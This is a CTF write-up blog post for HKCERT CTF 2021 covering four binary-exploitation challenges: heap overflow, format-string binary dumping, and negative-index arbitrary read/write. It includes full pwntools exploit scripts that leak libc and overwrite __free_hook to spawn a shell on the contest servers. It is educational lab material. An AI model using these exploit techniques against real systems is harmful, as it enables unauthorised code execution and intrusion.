---
title: "HKcertCTF 2021 Writeups"
date: 2021-11-17T03:05:19+08:00
toc: true
draft: false
tags: [ctf]
---

<!--more-->
# HKCERT21 - T0028 - Writeups
## Easyheap

### Step 1: Find the vulnerability

```c
void add(void)

{
  char size;
  int user_index;
  int i;
  void *user_ptr;
  void *msg_ptr;
  
  user_index = 999;
  i = 0;
  do {
    if (0x13 < i) {
LAB_001013cc:
      if (user_index == 999) {
        puts("can not add now");
      }
      else {
        user_ptr = calloc(0x20,1);
                    /* 123 */
        *(void **)(&user_storage + (long)user_index * 8) = user_ptr;
        **(undefined4 **)(&user_storage + (long)user_index * 8) = 0;
        *(int *)(*(long *)(&user_storage + (long)user_index * 8) + 4) = DAT_0010403c;
        DAT_0010403c = DAT_0010403c + 1;
        puts("Enter the message size for the user : ");
        __isoc99_scanf(&DAT_0010203f,&size);
        if (size < '\x01') {
          puts("Bye hacker");
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        *(char *)(*(long *)(&user_storage + (long)user_index * 8) + 8) = size;
        msg_ptr = calloc((long)size,1);
        puts("Input message content >>");
        read_all(msg_ptr,(int)size);
        *(void **)(*(long *)(&user_storage + (long)user_index * 8) + 0x18) = msg_ptr;
      }
      return;
    }
    if (*(long *)(&user_storage + (long)i * 8) == 0) {
      user_index = i;
      goto LAB_001013cc;
    }
    i = i + 1;
  } while( true );
}

```

```c
void edit(void)

{
  int index;
  char size;
  
  puts("Which user?");
  __isoc99_scanf(&DAT_00102074,&index);
  if ((index < 0) || (0x13 < index)) {
    puts("Out of range detected");
  }
  else {
    if (*(long *)(&user_storage + (long)index * 8) == 0) {
      puts("Bye hacker");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    size = *(char *)(*(long *)(&user_storage + (long)index * 8) + 8);
    puts("Input message content >>");
    read_all(*(undefined8 *)(*(long *)(&user_storage + (long)index * 8) + 0x18),size + -1);
    *(char *)(*(long *)(&user_storage + (long)index * 8) + 8) =
         *(char *)(*(long *)(&user_storage + (long)index * 8) + 8) + -1;
  }
  return;
}

```

In add function, after created a user_ptr, the program will store the size in *user_ptr+8.
```c
*(char *)(*(long *)(&user_storage + (long)user_index * 8) + 8) = size;
```
In edit function, the program will read size-1 byte and decrease the size and store it when we are finished editing. 
```c
read_all(*(undefined8 *)(*(long *)(&user_storage + (long)index * 8) + 0x18),size + -1);
*(char *)(*(long *)(&user_storage + (long)index * 8) + 8) =
         *(char *)(*(long *)(&user_storage + (long)index * 8) + 8) + -1;
```
### Step2: exploit the bug
Therefore, we can exploit it to get a unlimited size.
1. we create a size = 1 chunks.
2. we edit it once, the program will decrease the size to be 0
3. if we edit it again, the read size will become negative number.

Which mean we got a most unlimited size to write our data into the chunk.

Thought this bug, we can create overflow the data to change the size of neighbour chunk's size (this size is the chunk size not the read size) and free it to have a unsorted bin and cause chunks overlap.
```python
add(1, "A")
# chunks for padding
for i in range(9):
    add(0x40, b"/bin/sh\x00")
edit(0, "\n")

# change the size of neighbour
payload = p64(0)*3 + p64(0x431)
edit(0, payload)

# free it to get a unsorted bin
remove(1)
```
### Step 3: Leak libc address
Then, we padding the first chunk to leak and get the libc_base address
```python
view(0)
p.recvuntil("A"*0x20)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ebbe0

info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
info(f"free_hook: {hex(free_hook)}")
```
### Step 4: Get shell
The last step is edit the first to write __free_hook to victim chunk and edit the victim with system to get shell
```python
payload = p64(free_hook) * 24
edit(0, payload)

edit(2, p64(system))
remove(5)
```

Full exploit script:
```python
from pwn import *

TARGET = './heap'
HOST = 'chalp.hkcert21.pwnable.hk'
PORT = 28359
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    libc = ELF('./libc-2.31.so')
else:
    p = process(TARGET, env={"LD_PRELOAD": "./libc-2.31.so"})
    libc = elf.libc
    gdbscript = '''
    c
    heap chunks
    heap bins'''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#---

def add(size, data):
    p.sendlineafter("$", "1")
    p.sendlineafter("Enter the message size for the user :", str(size))
    p.sendafter("Input message content >>", data)
def view(idx):
    p.sendlineafter("$", "2")
    p.sendlineafter("Want to check the message of which user?", str(idx))
def edit(idx, data):
    p.sendlineafter("$", "3")
    p.sendlineafter("Which user?", str(idx))
    p.sendafter("Input message content >>", data)
def remove(idx):
    p.sendlineafter("$", "4")
    p.sendlineafter("Delete which user?", str(idx))

add(1, "A")
# chunks for padding
for i in range(9):
    add(0x40, b"/bin/sh\x00")
edit(0, "\n")

# change the size of neighbour
payload = p64(0)*3 + p64(0x431)
edit(0, payload)

# free it to get a unsorted bin
remove(1)

payload = 'A'*0x20
edit(0, payload)

view(0)
p.recvuntil("A"*0x20)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ebbe0

info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
info(f"free_hook: {hex(free_hook)}")

payload = p64(free_hook) * 24
edit(0, payload)

edit(2, p64(system))
remove(5)


p.interactive()
```


## Unobserved Box
### Step 1: Dump the source code throught format string
This challenge only give us the server to connect.
My teammate tell me this challenge may have format string vulnerability when I was sleeping.
```bash
┌──(bot3310㉿kali)-[~/ctf/hkcert2021/box]
└─$ nc chalp.hkcert21.pwnable.hk 28132                                                                                                                                                                                              130 ⨯ 1 ⚙
%p %x %c %d
0x7ffee2d4b670 e2d4b670  1179970944 is not the correct answer.


```
After I few tries, we can't get any useful information from the server.
However, I remember Liveoverflow has a video talk about a challenge like this.
https://www.youtube.com/watch?v=XuzuFUGuQv0&t=450s

I wrote a script to dump the source file and pass it to my teammate to reverse it.

Full dump script:
```python
from pwn import *

TARGET = './'
HOST = 'chalp.hkcert21.pwnable.hk'
PORT = 28132
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
#elf = ELF(TARGET)

#---

output = b''
addr = 0x400000

def dump(addr):
    sleep(0.1)
    p = remote(HOST, PORT)
    p.sendline(b"%7$s||||" + p64(addr))
    text = p.recvuntil("||||", timeout=5000)[:-4]
    p.close()
    print(f"trying {hex(addr)} : {str(text)} {len(text)}")
    return text
    
myfile = open("dump", "ab")
while True:
    try:
        if addr > 0x406000:
            break

        data = dump(addr)
        if len(data) == 0:
            myfile.write(b'\x00')
            addr += 1
        else:
            myfile.write(data)
            addr += len(data)
    except  Exception as e:
        continue


#p.interactive()
```
### Step 2: Reverse

Now that we have the binary, we can use decompilers like ghidra to look at the original code. There are 3 functions that interest us the most:

```c
undefined8 FUN_0040142f(void)

{
  int iVar1;
  char local_28 [32];
  
  FUN_004013d9(local_28,0x1f);
  iVar1 = FUN_00401192(local_28);
  if (iVar1 == 1) {
    FUN_004012c8();
  }
  else {
    printf(local_28);
    puts(" is not the correct answer.");
  }
  return 0;
}
```

```c
void FUN_004013d9(void *param_1,int param_2)

{
  ssize_t sVar1;
  
  sVar1 = read(0,param_1,(long)param_2);
  if (*(char *)((long)param_1 + (long)(int)sVar1 + -1) == '\n') {
    *(undefined *)((long)param_1 + (long)(int)sVar1 + -1) = 0;
  }
  return;
}
```

In `FUN_0040142f`, we can see the familiar `<user_input> is not the correct answer.` message is in the else block. So maybe we should try to satisfy the other branching condition, by making `FUN_00401192(local_28) == 1`. In the last line, `FUN_004013d9(local_28,0x1f)` is reading string from stdin and preforming some string operations, so `local_28` shoud be our input string. Let's look at `FUN_00401192` to see when will this function return `1`:

```c
undefined8 FUN_00401192(char *param_1)

{
  int iVar1;
  size_t sVar2;
  undefined8 uVar3;
  
  sVar2 = strlen(param_1);
  if (sVar2 == 0x13) {
    if ((param_1[6] == '_') && (param_1[9] == param_1[6])) {
      iVar1 = strncmp(param_1,"printf",6);
      if (iVar1 == 0) {
        iVar1 = strncmp(param_1 + 10,"danger",6);
        if (iVar1 == 0) {
          if (param_1[0x12] == 's') {
            if (param_1[0x11] == 'u') {
              if (param_1[0x10] == 'o') {
                if (param_1[2] == param_1[7]) {
                  if (param_1[8] == param_1[0x12]) {
                    uVar3 = 1;
                  }
                  else {
                    uVar3 = 0;
                  }
                }
                else {
                  uVar3 = 0;
                }
              }
              else {
                uVar3 = 0;
              }
            }
            else {
              uVar3 = 0;
            }
          }
          else {
            uVar3 = 0;
          }
        }
        else {
          uVar3 = 0;
        }
      }
      else {
        uVar3 = 0;
      }
    }
    else {
      uVar3 = 0;
    }
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}
```

Let `s` be the required string. We have
```python
len(s) = 13
s[6] = s[9] = '_'
s[1:5] = 'printf'
s[10:15] = 'danger'
s[16] = 'o'
s[17] = 'u'
s[18] = 's'
s[2] = s[7]
s[8] = s[18]
```
which is `"printf_is_dangerous"`.

Finally, send this string to the server and get flag:
```bash
$ echo printf_is_dangerous | nc chalp.hkcert21.pwnable.hk 28132
hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}
```

flag: `hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}`

## Fortune Cookie 1

### Step 1: Fund the vulnerability
This challenge has provided us the source code.

In edit and read function, the program didn't check the index smaller than 0.
```c
void edit_cookie() {
    long long idx;
    
    printf("Which cookie?[0-%d]: ", cookie_num-1);
    scanf("%llu", &idx);

    if (idx >= cookie_num) {
        _abort("Invalid index!");
    }

    printf("New Message: ");

    int num_read = read(0, msg[idx], msg_size[idx]-1);
    if (msg[idx][num_read] == '\n')
        msg[idx][num_read] = '\0';
    printf("Done!\n\n");

}

void read_cookie() {
    long long idx;
    
    printf("Which cookie?[0-%d]: ", cookie_num-1);
    scanf("%llu", &idx);

    if (idx >= cookie_num) {
        _abort("Invalid index!");
    }

    printf("%s\n\n", msg[idx]);
}

```

Which mean we can read and edit the data outside the msg array
In the address below the msg location, I found a important address.
```bash
gef➤  tele (double*)&msg-0x10 20
0x000055770ddb4fe0│+0x0000: 0x00007f3f8ad10750  →  <__libc_start_main+0> push r14
0x000055770ddb4fe8│+0x0008: 0x0000000000000000
0x000055770ddb4ff0│+0x0010: 0x0000000000000000
0x000055770ddb4ff8│+0x0018: 0x00007f3f8ad2a2e0  →  <__cxa_finalize+0> push r15
0x000055770ddb5000│+0x0020: 0x0000000000000000
0x000055770ddb5008│+0x0028: 0x000055770ddb5008  →  [loop detected]
0x000055770ddb5010│+0x0030: 0x0000000000000000
0x000055770ddb5018│+0x0038: 0x0000000000000000
0x000055770ddb5020│+0x0040: 0x00007f3f8b0b5620  →  0x00000000fbad2887
0x000055770ddb5028│+0x0048: 0x0000000000000000
0x000055770ddb5030│+0x0050: 0x00007f3f8b0b48e0  →  0x00000000fbad208b
0x000055770ddb5038│+0x0058: 0x0000000000000000
0x000055770ddb5040│+0x0060: 0x00007f3f8b0b5540  →  0x00000000fbad2087
0x000055770ddb5048│+0x0068: 0x0000000000000000
0x000055770ddb5050│+0x0070: 0x0000000000000000
0x000055770ddb5058│+0x0078: 0x0000000000000000
0x000055770ddb5060│+0x0080: 0x000055770e9c5240  →  "The best thing to do first thing in the morning is"
0x000055770ddb5068│+0x0088: 0x000055770e9c52a0  →  "Every 60 seconds in africa a minute passes."
0x000055770ddb5070│+0x0090: 0x000055770e9c52e0  →  "Monday hates you, too."
0x000055770ddb5078│+0x0098: 0x000055770e9c5300  →  "Money is not everything. There's always credit car[...]"
```

You can see in `0x000055770ddb5008`, there has a address pointer to itself.

We can control this address by index -11 to get the arbitrary write and read.

### Step 2: Leak address
By input -11 to show function, we can leak the data of that address which is it's address.

```python
p.recv(7)
target = u64(p.recv(6).ljust(8, b'\x00')) + 0x80
info(f"target: {hex(target)}")
for i in range(27):
    create(0x88, b"/bin/sh\x00")
```
### Step 3: Leak libc address
1. edit it point to our controlable place, which is the address to store #5 chunk address
2. edit it point to 0x000055770ddb5020 where stored a address of libc
3. show the #5 chunk to leak the libc address
```python
target = leak + 0x80
edit(-11, p64(target))
edit(-11, p64(target-0x68))
show(5)
p.recv(8)
#input()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c5620
info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
```

### Step 4: Get shell
Change the place pointed to #5 chunk addrss point to *__free_hook* and edit it with `system` address.
Call `eatCookie()` to free a chunk contains /bin/sh` to get shell

```python
edit(-11, p64(free_hook))
edit(5, p64(system))
eat()
```

Full exploit script:
```python
from pwn import *

TARGET = './chall'
HOST = 'chalp.hkcert21.pwnable.hk'
PORT = 38230
context.arch = 'amd64' # i386/amd64
#context.log_level = 'debug'
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    libc = ELF("./libc-2.23.so")
else:
    p = process(TARGET ,env = {"LD_PRELOAD": "./libc-2.23.so"})
    libc = elf.libc
    gdbscript = ''''''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#---

def eat():
    p.sendlineafter(">", '1')
def create(size, data):
    p.sendlineafter(">", '2')
    p.sendlineafter("How long is the message?", str(size))
    p.sendlineafter("Input your message:", data)
def edit(idx, data):
    p.sendlineafter(">", '3')
    p.sendlineafter("Which cookie?", str(idx))
    p.sendafter("New Message:", data)
def show(idx):
    p.sendlineafter(">", '4')
    p.sendlineafter("Which cookie?", str(idx))

#print(p.recvline())
show(-11)
p.recv(7)
leak = u64(p.recv(6).ljust(8, b'\x00'))
info(f"leak: {hex(leak)}")
for i in range(27):
    create(0x88, b"/bin/sh\x00")

target = leak + 0x80
edit(-11, p64(target))
edit(-11, p64(target-0x68))
show(5)
p.recv(8)
#input()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c5620
info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

edit(-11, p64(free_hook))
edit(5, p64(system))
eat()


p.interactive()
```

## Fortune Cookie 2
This challenge has the source as Fortune Cookie 1
So I used the same exploit script with a little change related to the different of libc version.

Full exploit script:
```python
from pwn import *

TARGET = './chall'
HOST = 'chalp.hkcert21.pwnable.hk'
PORT = 38231
context.arch = 'amd64' # i386/amd64
#context.log_level = 'debug'
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    libc = ELF("./libc-2.27.so")
else:
    p = process(TARGET ,env = {"LD_PRELOAD": "./libc-2.27.so"})
    libc = elf.libc
    gdbscript = ''''''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#---

def eat():
    p.sendlineafter(">", '1')
def create(size, data):
    p.sendlineafter(">", '2')
    p.sendlineafter("How long is the message?", str(size))
    p.sendlineafter("Input your message:", data)
def edit(idx, data):
    p.sendlineafter(">", '3')
    p.sendlineafter("Which cookie?", str(idx))
    p.sendafter("New Message:", data)
def show(idx):
    p.sendlineafter(">", '4')
    p.sendlineafter("Which cookie?", str(idx))

#print(p.recvline())
show(-11)
p.recv(7)
target = u64(p.recv(6).ljust(8, b'\x00')) + 0x80
info(f"target: {hex(target)}")
for i in range(27):
    create(0x88, b"/bin/sh\x00")

# #input()
edit(-11, p64(target))
edit(-11, p64(target-0x68))
show(5)
p.recv(8)
#input()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) -0x3ec760
info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
edit(-11, p64(free_hook))
edit(5, p64(system))
print("hi")
eat()


p.interactive()
```
